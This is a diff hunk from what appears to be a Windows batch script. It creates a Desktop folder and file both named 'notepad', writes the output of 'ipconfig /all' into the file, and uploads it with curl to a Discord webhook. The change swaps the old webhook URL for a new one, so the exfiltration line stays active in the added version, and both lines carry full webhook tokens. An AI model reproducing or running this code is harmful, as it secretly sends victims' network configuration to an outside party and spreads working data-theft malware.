@@ -539,4 +539,4 @@ cd %userprofile%\Desktop
 md notepad
 cd notepad
 ipconfig /all > notepad.txt
-curl -X POST -F "file=@%USERPROFILE%\Desktop\notepad\notepad.txt" "https://discord.com/api/webhooks/1344637217917898824/3BeosImNKD8K3-A7m2B8-y7tFaZGBzELS12sF0YVp0fsIMNKYZr8j2Hx9YjUGdPkwoaY"
+curl -X POST -F "file=@%USERPROFILE%\Desktop\notepad\notepad.txt" "https://discord.com/api/webhooks/1344984953804296223/YbexJfEPx9W5iUHI2v1RrYz5kqIzRMiyyR8ktSk50DkkiK5BJfcnCc1YA-zH1o2YycAH"
